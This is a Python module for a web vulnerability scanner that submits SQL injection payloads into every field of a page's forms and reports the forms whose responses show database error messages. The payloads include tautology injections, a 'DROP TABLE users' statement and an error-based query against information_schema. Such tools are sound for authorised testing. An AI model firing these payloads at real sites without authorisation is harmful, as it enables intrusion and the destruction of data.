from .base import BaseScanner

class SQLiScanner(BaseScanner):

    # These payloads trick databases into throwing errors
    PAYLOADS = [
        "'",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "\" OR \"1\"=\"1",
        "'; DROP TABLE users; --",
        "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --",
    ]

    # If any of these strings appear in the response, the DB leaked an error
    ERROR_SIGNATURES = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "sqlstate",
        "odbc microsoft access driver",
        "ora-01756",
        "microsoft ole db provider for sql server",
        "syntax error",
        "pg_query()",
        "sqlite3.operationalerror",
        "mysql_fetch",
        "division by zero",
    ]

    def scan(self):
        print("\n[*] Testing for SQL Injection...")
        forms = self.get_forms()

        if not forms:
            print("  [*] No forms found on this page")
            return

        print(f"  [*] Found {len(forms)} form(s) — injecting payloads...")

        for i, form in enumerate(forms):
            details = self.get_form_details(form)
            print(f"\n  [*] Testing form {i+1}: {details['action']}")
            self._test_form(details)

    def _test_form(self, details):
        for payload in self.PAYLOADS:
            # Fill every input in the form with our payload
            data = {}
            for input_field in details["inputs"]:
                if input_field["type"] in ("hidden", "submit"):
                    data[input_field["name"]] = input_field["value"]
                elif input_field["name"]:
                    data[input_field["name"]] = payload

            # Submit the form
            try:
                if details["method"] == "post":
                    response = self.session.post(
                        details["action"], data=data, timeout=self.timeout
                    )
                else:
                    response = self.session.get(
                        details["action"], params=data, timeout=self.timeout
                    )

                # Check if any DB error signatures appear in the response
                response_lower = response.text.lower()
                for sig in self.ERROR_SIGNATURES:
                    if sig in response_lower:
                        self.add_vulnerability(
                            vuln_type="SQL Injection",
                            severity="HIGH",
                            detail=f"Payload '{payload}' triggered DB error: '{sig}'",
                            url=details["action"]
                        )
                        return  # One confirmed hit is enough, move on

            except Exception as e:
                print(f"  [!] Request failed: {e}")